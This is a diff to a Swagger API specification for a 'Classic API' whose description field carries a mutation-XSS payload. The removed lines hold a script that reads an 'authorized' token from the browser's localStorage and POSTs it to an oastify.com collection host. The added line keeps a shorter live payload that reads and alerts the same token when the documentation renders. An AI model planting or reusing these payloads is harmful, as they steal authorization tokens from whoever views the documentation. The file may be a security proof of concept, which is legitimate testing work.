@@ -2,32 +2,7 @@ swagger: '2.0'
 info:
   title: Classic API Resource Documentation
   description: |
-    <form><math><mtext></form>
-    <form>
-      <mglyph>
-        <svg>
-          <mtext>
-            <textarea><path id="</textarea>
-            <img src="1" onerror="handleData()">
-            <script>
-              function handleData() {
-                var data = localStorage.getItem('authorized');
-                if (data) {
-                  // Prompt the user with the value
-                  alert(data);
-                  // Send the data to your server
-                  var xhr = new XMLHttpRequest();
-                  xhr.open('POST', 'https://hg1ouijeff2z6whrf5fly5ij9af13rrg.oastify.com', true);
-                  xhr.setRequestHeader('Content-Type', 'application/json');
-                  xhr.send(JSON.stringify({ authorized: data }));
-                }
-              }
-            </script>
-          </path>
-        </mtext>
-      </svg>
-    </mglyph>
-    </form>
+    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror='var a=localStorage.getItem(\'authorized\'); alert(a);' src=1>"></form>
   version: production
 basePath: /JSSResource/
 produces:
